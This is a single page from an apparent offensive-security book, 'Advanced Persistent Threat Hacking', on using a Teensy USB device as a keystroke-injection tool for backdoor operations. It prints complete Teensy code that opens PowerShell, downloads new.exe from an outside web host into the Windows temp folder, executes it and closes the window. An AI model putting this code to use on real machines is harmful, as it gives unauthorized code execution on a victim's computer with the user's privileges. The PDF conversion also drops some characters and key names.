<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title/><link rel="stylesheet" href="../css/base.min.css"/><link rel="stylesheet" href="../css/fancy.min.css"/><link rel="stylesheet" href="../css/pdf.css"/><meta name="viewport" content="width=640, height=824"/></head><body><div id="page_body"><div id="pf13b" class="pf w2 h2" data-page-no="13b"><div class="pc pc13b w2 h2"><div class="t m0 xbe h10 y83 ff1 fs9 fc0 sc0 lsa ws0">292<span class="_ _d"> </span><span class="ff2 fs2 ls8">Advanced Persistent Threat Hacking<span class="_ _1e"/> </span></div><div class="t m0 x3 hd y11c ff4 fs7 fc0 sc0 ls0 ws0">source le is compiled into a .hex le. <span class="_ _1b"/>Y<span class="_ _3"/>ou can manually upload a .hex le using the </div><div class="t m0 x3 hd y11d ff4 fs7 fc0 sc0 ls0 ws0">T<span class="_ _2"/>eensy Loader<span class="_ _2"/>.</div><div class="t m0 x4 hd y11e ff4 fs7 fc0 sc0 ls0 ws0">That’<span class="_ _2"/>s it! Once you upload the code to your T<span class="_ _2"/>eensy device and run the <span class="_ _0"/>T<span class="_ _3"/>eensy<span class="_ _0"/>, it </div><div class="t m0 x3 h2c y11f ff4 fs7 fc0 sc0 ls0 ws0">will open the Start menu. T<span class="_ _3"/>ype <span class="ff3">cmd.exe</span> and press . <span class="_ _3"/>Y<span class="_ _3"/>ou should note that this </div><div class="t m0 x3 hd y232 ff4 fs7 fc0 sc0 ls0 ws0">code is designed for <span class="_ _0"/>W<span class="_ _0"/>indo<span class="_ _0"/>ws <span class="_ _2"/>V<span class="_ _0"/>ista or later<span class="_ _0"/>, in which the def<span class="_ _0"/>ault action will be the </div><div class="t m0 x3 hd y233 ff4 fs7 fc0 sc0 ls0 ws0">Run dialog box after pressing the <span class="_ _0"/>W<span class="_ _0"/><span class="_ _0"/> ke<span class="_ _0"/>y<span class="_ _2"/>. If you’<span class="_ _0"/>re testing on an older system </div><div class="t m0 x3 hd y122 ff4 fs7 fc0 sc0 ls0 ws0">such as <span class="_ _0"/>W<span class="_ _0"/>indo<span class="_ _0"/>ws XP<span class="_ _1b"/>, you’ll hav<span class="_ _0"/>e to rst press the  ke<span class="_ _0"/>y to open a Run dialog box.</div><div class="t m0 x3 h7 y1dc2 ff1 fs3 fc0 sc0 ls0 ws0">T<span class="_ _3"/>eensy Powershell</div><div class="t m0 x3 hd y3e4 ff4 fs7 fc0 sc0 ls0 ws0">Y<span class="_ _1b"/>ou now understand the simple po<span class="_ _0"/>wer behind the T<span class="_ _3"/>eensy device. <span class="_ _2"/>Anything we can </div><div class="t m0 x3 hd y1af0 ff4 fs7 fc0 sc0 ls0 ws0">do with the ke<span class="_ _0"/>yboard while sitting at the computer we can automate using the T<span class="_ _3"/>eensy </div><div class="t m0 x3 hd y1af1 ff4 fs7 fc0 sc0 ls0 ws0">de<span class="_ _0"/>vice. In addition, anything we type will be performed with the same pri<span class="_ _0"/>vileges as </div><div class="t m0 x3 hd y1af2 ff4 fs7 fc0 sc0 ls0 ws0">the currently logged in user<span class="_ _2"/>. <span class="_ _0"/>Aside from using any commands a<span class="_ _0"/>v<span class="_ _0"/>ailable to use via </div><div class="t m0 x3 hd y1af3 ff4 fs7 fc0 sc0 ls0 ws0">cmd.ex<span class="_ _0"/>e, we also hav<span class="_ _0"/>e a lot of options with the <span class="_ _0"/>W<span class="_ _0"/>indo<span class="_ _0"/>ws Po<span class="_ _0"/>wershell. Po<span class="_ _0"/>wershell </div><div class="t m0 x3 hd y1af4 ff4 fs7 fc0 sc0 ls0 ws0">is an extremely v<span class="_ _0"/>ersatile <span class="_ _0"/>W<span class="_ _0"/>indo<span class="_ _0"/>ws shell that was designed to pro<span class="_ _0"/>vide a lot of the </div><div class="t m0 x3 hd y1af5 ff4 fs7 fc0 sc0 ls0 ws0">functionality that Unix and Linux admins hav<span class="_ _0"/>e enjoyed for so long. <span class="_ _0"/>W<span class="_ _3"/>e can’t </div><div class="t m0 x3 hd y1af6 ff4 fs7 fc0 sc0 ls0 ws0">possibly cov<span class="_ _0"/>er all of the exibility of the Po<span class="_ _0"/>wershell here, b<span class="_ _0"/>ut we will show a fe<span class="_ _0"/>w </div><div class="t m0 x3 hd y1af7 ff4 fs7 fc0 sc0 ls0 ws0">possibilities of ho<span class="_ _0"/>w we can use it to perform some valuable backdoor operations.</div><div class="t m0 x4 hd y1af8 ff4 fs7 fc0 sc0 ls0 ws0">Using our T<span class="_ _3"/>eensy device, we’ll simply open a Po<span class="_ _0"/>wershell windo<span class="_ _0"/>w and type out a </div><div class="t m0 x3 hd y1dc3 ff4 fs7 fc0 sc0 ls0 ws0">short Po<span class="_ _0"/>wershell script. In the following e<span class="_ _0"/>xample, we’ll do<span class="_ _0"/>wnload the ne<span class="_ _0"/>w<span class="_ _2"/>.ex<span class="_ _0"/>e le </div><div class="t m0 x3 hd y1dc4 ff4 fs7 fc0 sc0 ls0 ws0">from the www<span class="_ _2"/>.apthacker<span class="_ _2"/>.com website. <span class="_ _0"/>After it do<span class="_ _0"/>wnloads, we’ll e<span class="_ _0"/>xecute the le and </div><div class="t m0 x3 hd y1afb ff4 fs7 fc0 sc0 ls0 ws0">then close the Po<span class="_ _0"/>wershell window<span class="_ _3"/>.</div><div class="t m0 x3 h40 y1dc5 fff fs5 fc0 sc0 ls0 ws0">// Default Teensy LED pin location = 11</div><div class="t m0 x3 h40 y1dc6 fff fs5 fc0 sc0 ls0 ws0">const int led = 11; </div><div class="t m0 x3 h40 y1dc7 fff fs5 fc0 sc0 ls0 ws0">void setup(void)</div><div class="t m0 x3 h40 y1dc8 fff fs5 fc0 sc0 ls0 ws0">{</div><div class="t m0 x3 h40 y1dc9 fff fs5 fc0 sc0 ls0 ws0">      Serial.begin(9600);</div><div class="t m0 x3 h40 y1dca fff fs5 fc0 sc0 ls0 ws0">      delay(1000);</div><div class="t m0 x3 h40 y1dcb fff fs5 fc0 sc0 ls0 ws0">      Keyboard.set_modifier(MODIFIERKEY_LEFT_GUI);</div><div class="t m0 x3 h40 y1dcc fff fs5 fc0 sc0 ls0 ws0">      Keyboard.send_now();</div><div class="t m0 x3 h40 y1dcd fff fs5 fc0 sc0 ls0 ws0">      Keyboard.set_modifier(0);</div><div class="t m0 x3 h40 y1dce fff fs5 fc0 sc0 ls0 ws0">      Keyboard.send_now();</div><div class="t m0 x3 h40 y1dcf fff fs5 fc0 sc0 ls0 ws0">      delay(2000);</div><div class="t m0 x3 h40 y1dd0 fff fs5 fc0 sc0 ls0 ws0">      Keyboard.print("powershell.exe\n");</div><div class="t m0 x3 h40 y1dd1 fff fs5 fc0 sc0 ls0 ws0">      delay(2000);</div><div class="t m0 x3 h40 y1dd2 fff fs5 fc0 sc0 ls0 ws0">      Keyboard.print("(new-object System.Net.WebClient).Downloadfile(\"http://</div><div class="t m0 x3 h40 y1dd3 fff fs5 fc0 sc0 ls0 ws0">apthacker.com/new.exe\", \"C:\\windows\\temp\\new.exe\")\n ");</div><div class="t m0 x3 h40 y1dd4 fff fs5 fc0 sc0 ls0 ws0">        Keyboard.print("&amp; c:\\windows\\temp\\new.exe\n ");</div><div class="t m0 x3 h40 y1dd5 fff fs5 fc0 sc0 ls0 ws0">        Keyboard.print("exit\n ");</div><div class="t m0 x3 h40 y1dd6 fff fs5 fc0 sc0 ls0 ws0">}</div><a class="" href="http://www.apthacker.com"><div class="d m1" style="border-style:none;position:absolute;left:142.826909px;bottom:370.116402px;width:90.000000px;height:12.000000px;background-color:rgba(255,255,255,0.000001);"/></a></div><div class="pi" data-data="{&#34;ctm&#34;:[1.209373,0.000000,0.000000,1.209373,0.000000,0.000000]}"/></div></div></body></html>